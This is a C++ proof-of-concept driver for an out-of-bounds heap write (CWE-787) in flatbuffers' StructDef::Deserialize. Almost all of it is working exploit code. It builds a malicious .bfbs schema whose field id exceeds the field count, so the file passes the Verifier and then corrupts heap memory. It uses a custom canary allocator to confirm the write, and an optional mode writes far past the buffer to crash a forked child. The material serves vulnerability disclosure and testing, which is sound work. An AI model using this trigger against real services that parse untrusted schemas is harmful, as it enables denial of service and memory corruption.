// FlatbufOverrun — google/flatbuffers StructDef::Deserialize OOB write PoC driver.
//
// Builds a structurally-valid .bfbs reflection schema (passes the flatbuffers
// Verifier) whose single Field carries a `id` that is out of range for its parent
// Object's field vector. Parser::Deserialize() then runs the vulnerable loop in
// StructDef::Deserialize:
//
//     auto indexes = std::vector<uoffset_t>(of.size());
//     for (uoffset_t i = 0; i < of.size(); i++) indexes[of.Get(i)->id()] = i;
//
// which writes `indexes[field_id]` past the heap buffer when field_id >= of.size().
//
// We instrument the process's global operator new/delete with a redzone canary so
// the out-of-bounds WRITE is observed deterministically without ASan.

#include "flatbuffers/idl.h"
#include "flatbuffers/reflection.h"
#include "flatbuffers/reflection_generated.h"

#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <new>
#include <string>
#include <vector>

#include <sys/wait.h>
#include <unistd.h>

// ---------------------------------------------------------------------------
// Redzone canary allocator (poor-man's ASan for the vector's heap buffer).
// Every allocation gets a 0xCD canary immediately after the requested size; the
// vulnerable `indexes[field_id] = i` write lands in this redzone and is detected
// when the allocation is freed.
// ---------------------------------------------------------------------------
namespace {
struct Header { size_t size; uint64_t magic; };
constexpr size_t REDZONE = 64;
constexpr uint8_t CANARY = 0xCD;
constexpr uint64_t MAGIC = 0xFB0FB0FB0FBULL;

bool g_oob = false;
size_t g_oob_offset = 0;
uint8_t g_oob_first = 0;

void* raw_alloc(size_t size) {
  void* raw = std::malloc(sizeof(Header) + size + REDZONE);
  if (!raw) throw std::bad_alloc();
  auto* h = static_cast<Header*>(raw);
  h->size = size;
  h->magic = MAGIC;
  auto* base = static_cast<uint8_t*>(raw) + sizeof(Header);
  std::memset(base, 0xAB, size);            // data region (client overwrites)
  std::memset(base + size, CANARY, REDZONE);  // redzone canary
  return base;
}

void raw_free(void* p) noexcept {
  if (!p) return;
  auto* base = static_cast<uint8_t*>(p);
  auto* h = reinterpret_cast<Header*>(base - sizeof(Header));
  // Validate the redzone; the vulnerable vector write corrupts it.
  for (size_t i = 0; i < REDZONE; i++) {
    if (base[h->size + i] != CANARY) {
      if (!g_oob) {
        g_oob = true;
        g_oob_offset = h->size + i;
        g_oob_first = base[h->size + i];
      }
    }
  }
  std::free(h);
}
}  // namespace

void* operator new(size_t size) { return raw_alloc(size); }
void* operator new[](size_t size) { return raw_alloc(size); }
void operator delete(void* p) noexcept { raw_free(p); }
void operator delete[](void* p) noexcept { raw_free(p); }
void operator delete(void* p, size_t) noexcept { raw_free(p); }
void operator delete[](void* p, size_t) noexcept { raw_free(p); }
void* operator new(size_t size, const std::nothrow_t&) noexcept {
  try { return raw_alloc(size); } catch (...) { return nullptr; }
}
void* operator new[](size_t size, const std::nothrow_t&) noexcept {
  try { return raw_alloc(size); } catch (...) { return nullptr; }
}
void operator delete(void* p, const std::nothrow_t&) noexcept { raw_free(p); }
void operator delete[](void* p, const std::nothrow_t&) noexcept { raw_free(p); }

// ---------------------------------------------------------------------------
// Craft the malicious .bfbs. `field_id` is attacker-controlled in a real .bfbs
// (reflection.fbs: `id:ushort;` with no cross-check against the field count).
// ---------------------------------------------------------------------------
static std::vector<uint8_t> build_bfbs(uint16_t field_id) {
  flatbuffers::FlatBufferBuilder b(1024);
  auto name = b.CreateString("T");
  auto fname = b.CreateString("f");

  auto type = reflection::CreateType(b, reflection::BaseType::Int);
  auto field = reflection::CreateField(
      b, fname, type, field_id, /*offset=*/0);

  std::vector<flatbuffers::Offset<reflection::Field>> fields{field};
  auto fields_v = b.CreateVector(fields);

  auto obj = reflection::CreateObject(
      b, name, fields_v, /*is_struct=*/false, /*minalign=*/4, /*bytesize=*/0);

  std::vector<flatbuffers::Offset<reflection::Object>> objs{obj};
  auto objs_v = b.CreateVector(objs);
  std::vector<flatbuffers::Offset<reflection::Enum>> enums{};
  auto enums_v = b.CreateVector(enums);

  auto schema = reflection::CreateSchema(b, objs_v, enums_v,
                                         /*file_ident=*/0, /*file_ext=*/0,
                                         /*root_table=*/obj);
  reflection::FinishSchemaBuffer(b, schema);

  return std::vector<uint8_t>(b.GetBufferPointer(),
                              b.GetBufferPointer() + b.GetSize());
}

// ---------------------------------------------------------------------------
// Run Deserialize on the crafted schema; report the OOB write (if any).
// ---------------------------------------------------------------------------
static bool run(uint16_t field_id, const char* label) {
  g_oob = false;
  g_oob_offset = 0;
  g_oob_first = 0;

  auto buf = build_bfbs(field_id);
  flatbuffers::Parser p;
  bool ok = p.Deserialize(buf.data(), buf.size());

  std::printf("[%s] field_id=0x%04x (%u)  Deserialize=%s\n", label, field_id,
              field_id, ok ? "true" : "false");
  if (!p.error_.empty())
    std::printf("       parser.error_ = \"%s\"\n", p.error_.c_str());
  if (g_oob) {
    std::printf("       *** OOB WRITE DETECTED: redzone byte +%zu corrupted "
                "0x%02x -> 0x%02x\n",
                g_oob_offset, CANARY, g_oob_first);
    return true;
  }
  std::printf("       no redzone corruption (in-bounds)\n");
  return false;
}

int main(int argc, char** argv) {
  bool huge = argc > 1 && std::string(argv[1]) == "--huge";
  std::printf("=== FlatbufOverrun: flatbuffers StructDef::Deserialize OOB write "
              "(CWE-787) ===\n");
  std::printf("schema: reflection::Schema{ objects:[ Object{name=\"T\", "
              "fields:[Field{name=\"f\", id=ATTACKER}] } ] }\n\n");

  if (huge) {
    // id = 0xFFFF -> indexes[0xFFFF] = 0 writes ~256 KiB past a 4-byte vector,
    // smashing unmapped/foreign heap memory. Run in a forked child so the
    // parent survives and can report the SIGSEGV deterministically.
    std::fflush(stdout);
    pid_t pid = fork();
    if (pid == 0) {
      std::printf("[huge-id] id=0xFFFF (65535) — 1 field, indexes has 1 element\n");
      auto buf = build_bfbs(0xFFFF);
      flatbuffers::Parser p;
      p.Deserialize(buf.data(), buf.size());  // OOB write -> likely SIGSEGV
      std::printf("[huge-id] returned (no crash on this allocator layout)\n");
      _exit(0);
    }
    int status = 0;
    waitpid(pid, &status, 0);
    if (WIFSIGNALED(status))
      std::printf("[huge-id] child killed by signal %d (%s) — OOB write hit "
                  "unmapped memory\n",
                  WTERMSIG(status),
                  WTERMSIG(status) == SIGSEGV ? "SIGSEGV" : "?");
    else
      std::printf("[huge-id] child exited rc=%d\n", WEXITSTATUS(status));
  }

  // Primary demonstration: field_id == field count (1) => one element past end.
  bool oob = run(1, "canary");

  std::printf("\n");
  if (oob) {
    std::printf("FLATBUFFERS-OOB-CONFIRMED\n");
    return 0;
  }
  std::printf("FLATBUFFERS-OOB-NOT-OBSERVED\n");
  return 1;
}
